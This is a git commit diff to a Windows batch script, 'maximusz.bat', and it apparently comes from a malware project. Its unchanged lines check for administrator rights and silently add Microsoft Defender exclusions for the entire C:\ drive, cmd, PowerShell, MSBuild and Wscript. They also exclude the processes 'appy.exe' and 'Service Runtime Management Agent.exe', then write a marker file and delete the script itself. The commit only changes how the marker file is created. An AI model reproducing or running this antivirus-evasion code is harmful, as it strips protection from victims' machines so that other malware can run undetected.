59b99355f871c89c48cfe025ef6d6209065a8956
boycots563 <glowfitaura.orders@gmail.com>
2025-09-17 07:47:15 +0200

    Update maximusz.bat

--- maximusz.bat
+++ maximusz.bat
@@ -2,7 +2,7 @@
 NET SESSION >nul 2>&1
 if %errorlevel% == 0 (
     powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe', 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'appy.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'Service Runtime Management Agent.exe' -ErrorAction SilentlyContinue" >nul 2>&1
-    powershell -Command "$random = Get-Random -Minimum 100000 -Maximum 999999; $filePath = Join-Path $env:ProgramData \"flag1_errorlog$($random).txt\"; New-Item -Path $filePath -ItemType File -Force" >nul 2>&1
+    echo. > "%ProgramData%\flag1_errorlog.txt"
     del "%~f0" >nul 2>&1
     exit
 )
@@ -14,6 +14,6 @@ if %errorlevel% == 0 (
         goto loop
     )
     powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe', 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'appy.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'Service Runtime Management Agent.exe' -ErrorAction SilentlyContinue" >nul 2>&1
-    powershell -Command "$random = Get-Random -Minimum 100000 -Maximum 999999; $filePath = Join-Path $env:ProgramData \"flag1_errorlog$($random).txt\"; New-Item -Path $filePath -ItemType File -Force" >nul 2>&1
+    echo. > "%ProgramData%\flag1_errorlog.txt"
     del "%~f0" >nul 2>&1
     exit
